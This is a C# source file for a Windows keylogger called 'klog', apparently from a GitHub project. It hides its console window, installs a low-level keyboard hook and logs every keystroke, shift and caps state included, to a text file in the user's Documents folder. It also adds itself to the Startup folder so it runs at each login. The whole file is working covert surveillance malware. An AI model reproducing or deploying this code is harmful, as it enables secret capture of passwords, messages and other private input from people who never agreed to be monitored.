using System.Reflection;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.UI.WindowsAndMessaging;
using IWshRuntimeLibrary;
using File = System.IO.File;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    private const uint BufferSize = 10;
    // ReSharper disable InconsistentNaming
    private const int KEYDOWN = 0x0100;
    private const int KEYUP = 0x0101;
    private const int SYSKEYDOWN = 0x0104;
    // ReSharper restore InconsistentNaming

    private static readonly string PathToFile =
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt");

    private static readonly StreamWriter Writer = new(PathToFile, true);
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static bool _capsLockActive;
    private static bool _shiftActive;

    public static unsafe void Main()
    {
        HideWindow();
        LogFile.WriteInfo(PathToFile, Writer);
        AddToStartup();

        // write buffer on process exit
        AppDomain.CurrentDomain.ProcessExit += (_, _) =>
        {
            _kbHook?.Close();
            StringBuffer.Write(Writer);
            Writer.Dispose();
        };

        // TODO check something weird going on
        _capsLockActive = Keyboard.GetCapsLockState();

        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);

        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
    }

    /// <summary>
    /// Logs key presses to a file. Meant to be used with SetWindowsHookEx.
    /// </summary>
    private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();

        // checking for events other than keydown, syskeydown and keyup
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        var stringToWrite = "";

        // check for keydown
        if (wParam == KEYDOWN || wParam == SYSKEYDOWN) stringToWrite = HandleKeyDown(kbStruct);

        // handle keyup events as it is important with shift, alt and control
        if (wParam == KEYUP) stringToWrite = HandleKeyUp(kbStruct);

        StringBuffer.WriteToFile(stringToWrite, Writer);

        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    private static unsafe string HandleKeyDown(KBDLLHOOKSTRUCT* kbStruct)
    {
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
        // their code
        var stringToWrite = kbStruct->vkCode switch
        {
            0x08 => " [BACKSPACE] ",
            0x09 => "\n[TAB] ",
            0x0C => "\n[CLEAR] ",
            0x0D => "\n[ENTER] ",
            0x10 => "\n[SHIFT] ",
            0x11 => "\n[CTRL] ",
            0x12 => "\n[ALT] ",
            0x13 => "\n[PAUSE] ",
            0x14 when _capsLockActive => " [CAPS LOCK OFF] ",
            0x14 when !_capsLockActive => "\n[CAPS LOCK ON] ",
            0x15 => "\n[IME Kana/Hangul mode] ",
            0x17 => "\n[IME On] ",
            0x18 => "\n[IME final mode] ",
            0x19 => "\n[IME Hanja/Kanji mode] ",
            0x1A => "\n[IME Off] ",
            0x1B => "\n[ESCAPE] ",
            0x1C => "\n[IME convert] ",
            0x1D => "\n[IME nonconvert] ",
            0x1E => "\n[IME accept] ",
            0x1F => "\n[IME mode change request] ",
            0x20 => " [SPACE] ",
            0x21 => "\n[PAGE UP] ",
            0x22 => "\n[PAGE DOWN] ",
            0x23 => "\n[END] ",
            0x24 => "\n[HOME] ",
            0x25 => "\n[LEFT ARROW] ",
            0x26 => "\n[UP ARROW] ",
            0x27 => "\n[RIGHT ARROW] ",
            0x28 => "\n[DOWN ARROW] ",
            0x29 => "\n[SELECT] ",
            0x2A => "\n[PRINT] ",
            0x2B => "\n[EXECUTE] ",
            0x2C => "\n[PRINT SCREEN] ",
            0x2D => "\n[INSERT] ",
            0x2E => "\n[DELETE] ",
            0x2F => "\n[HELP] ",
            0x30 => "0",
            0x31 => "1",
            0x32 => "2",
            0x33 => "3",
            0x34 => "4",
            0x35 => "5",
            0x36 => "6",
            0x37 => "7",
            0x38 => "8",
            0x39 => "9",
            0x41 => "a",
            0x42 => "b",
            0x43 => "c",
            0x44 => "d",
            0x45 => "e",
            0x46 => "f",
            0x47 => "g",
            0x48 => "h",
            0x49 => "i",
            0x4A => "j",
            0x4B => "k",
            0x4C => "l",
            0x4D => "m",
            0x4E => "n",
            0x4F => "o",
            0x50 => "p",
            0x51 => "q",
            0x52 => "r",
            0x53 => "s",
            0x54 => "t",
            0x55 => "u",
            0x56 => "v",
            0x57 => "w",
            0x58 => "x",
            0x59 => "y",
            0x5A => "z",
            0x5B => "\n[LEFT WINDOWS KEY] ",
            0x5C => "\n[RIGHT WINDOWS KEY] ",
            0x5D => "\n[APPLICATIONS KEY] ",
            0x5F => "\n[SLEEP] ",
            0x60 => "[NUMPAD 0]",
            0x61 => "[NUMPAD 1]",
            0x62 => "[NUMPAD 2]",
            0x63 => "[NUMPAD 3]",
            0x64 => "[NUMPAD 4]",
            0x65 => "[NUMPAD 5]",
            0x66 => "[NUMPAD 6]",
            0x67 => "[NUMPAD 7]",
            0x68 => "[NUMPAD 8]",
            0x69 => "[NUMPAD 9]",
            0x6A => "\n[MULTIPLY] ",
            0x6B => "\n[ADD] ",
            0x6C => "\n[SEPARATOR] ",
            0x6D => "\n[SUBTRACT] ",
            0x6E => "\n[DECIMAL] ",
            0x6F => "\n[DIVIDE] ",
            0x70 => "\n[F1] ",
            0x71 => "\n[F2] ",
            0x72 => "\n[F3] ",
            0x73 => "\n[F4] ",
            0x74 => "\n[F5] ",
            0x75 => "\n[F6] ",
            0x76 => "\n[F7] ",
            0x77 => "\n[F8] ",
            0x78 => "\n[F9] ",
            0x79 => "\n[F10] ",
            0x7A => "\n[F11] ",
            0x7B => "\n[F12] ",
            0x7C => "\n[F13] ",
            0x7D => "\n[F14] ",
            0x7E => "\n[F15] ",
            0x7F => "\n[F16] ",
            0x80 => "\n[F17] ",
            0x81 => "\n[F18] ",
            0x82 => "\n[F19] ",
            0x83 => "\n[F20] ",
            0x84 => "\n[F21] ",
            0x85 => "\n[F22] ",
            0x86 => "\n[F23] ",
            0x87 => "\n[F24] ",
            0x90 => "\n[NUM LOCK] ",
            0x91 => "\n[SCROLL LOCK] ",
            0xA0 => "\n[LEFT SHIFT] ",
            0xA1 => "\n[RIGHT SHIFT] ",
            0xA2 => "\n[LEFT CONTROL] ",
            0xA3 => "\n[RIGHT CONTROL] ",
            0xA4 => " [LEFT ALT] ",
            0xA5 => "\n[RIGHT ALT] ",
            0xA6 => "\n[BROWSER BACK] ",
            0xA7 => "\n[BROWSER FORWARD] ",
            0xA8 => "\n[BROWSER REFRESH] ",
            0xA9 => "\n[BROWSER STOP] ",
            0xAA => "\n[BROWSER SEARCH] ",
            0xAB => "\n[BROWSER FAVOURITES] ",
            0xAC => "\n[BROWSER START/HOME] ",
            0xAD => "\n[VOLUME MUTE] ",
            0xAE => "\n[VOLUME DOWN] ",
            0xAF => "\n[VOLUME UP] ",
            0xB0 => "\n[NEXT TRACK] ",
            0xB1 => "\n[PREVIOUS TRACK] ",
            0xB2 => "\n[STOP MEDIA] ",
            0xB3 => "\n[PLAY/PAUSE MEDIA] ",
            0xB4 => "\n[START MAIL] ",
            0xB5 => "\n[SELECT MEDIA] ",
            0xB6 => "\n[START APPLICATION 1] ",
            0xB7 => "\n[START APPLICATION 2] ",
            // these should be correct for most keyboard layouts?
            0xBA when !_shiftActive => ";",
            0xBA when _shiftActive => ":",
            0xBB => "+",
            0xBC when !_shiftActive => ",",
            0xBC when _shiftActive => "<",
            0xBD => "-",
            0xBE when !_shiftActive => ".",
            0xBE when _shiftActive => ">",
            0xBF when !_shiftActive => "/",
            0xBF when _shiftActive => "?",
            0xC0 when !_shiftActive => "`",
            0xC0 when _shiftActive => "~",
            0xDB when !_shiftActive => "[",
            0xDB when _shiftActive => "{",
            0xDC when !_shiftActive => "\\",
            0xDC when _shiftActive => "|",
            0xDD when !_shiftActive => "]",
            0xDD when _shiftActive => "}",
            0xDE when !_shiftActive => "'",
            0xDE when _shiftActive => "\"",
            _ => $"[CODE {kbStruct->vkCode.ToString()}]"
        };

        // if caps lock or shift were pressed, set their fields
        if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = true;

        // check for letters
        if (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A)
        {
            // if either shift or caps are active but not both at the same time
            if ((_shiftActive || _capsLockActive) && !(_shiftActive && _capsLockActive))
            {
                return stringToWrite.ToUpper();
            }
        }

        return stringToWrite;
    }

    private static unsafe string HandleKeyUp(KBDLLHOOKSTRUCT* kbStruct)
    {
        var stringToWrite = kbStruct->vkCode switch
        {
            0xA0 => " [LEFT SHIFT UP] ",
            0xA1 => " [RIGHT SHIFT UP] ",
            0xA2 => " [LEFT CONTROL UP] ",
            0xA3 => " [RIGHT CONTROL UP] ",
            0xA4 => " [LEFT ALT UP] ",
            0xA5 => " [RIGHT ALT UP] ",
            _ => ""
        };

        // checking for shift keyup
        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = false;

        return stringToWrite;
    }

    /// <summary>
    /// Writes an informational string to the log file if it's empty.
    /// </summary>
    private static void WriteInfoToLogFile()
    {
        if (new FileInfo(PathToFile).Length != 0) return;

        Writer.Write($"https://github.com/schmaldeo/keylogger v{Assembly.GetEntryAssembly()!.GetName().Version} {DateTime.Now}\n\n" +
                          $"If you see something like: [CODE: xxxx], you can check what key the code represents on " +
                          $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n" +
                          $"Keyboard layout: {Keyboard.GetKeyboardLayout()}. Find more information about it on: " +
                          $"https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf\n" +
                          $"The modifier keys only modify the output to this file for the following characters: " +
                          $"; , . / ` [ ] \\ ', for the other ones like shift + numbers or alt graph + letters, you " +
                          $"need to find out yourself what keyboard layout it is and then just find out yourself what " +
                          $"the output was, as you can clearly see when the modifier keys are pressed and released, " +
                          $"as well as what was typed in while those were active.\n\n");
        Writer.Flush();
    }

    /// <summary>
    ///     Hides current console window.
    /// </summary>
    private static void HideWindow()
    {
        var hWnd = PInvoke.GetConsoleWindow();
        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
    }

    private static void AddToStartup()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var shortcutPath = Path.Combine(startupFolderPath, "klog.lnk");
        var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "klog.exe");

        if (File.Exists(shortcutPath)) return;
        var wsh = new WshShell();
        if (wsh.CreateShortcut(shortcutPath) is not IWshShortcut shortcut) return;
        shortcut.TargetPath = path;
        shortcut.Save();
    }
}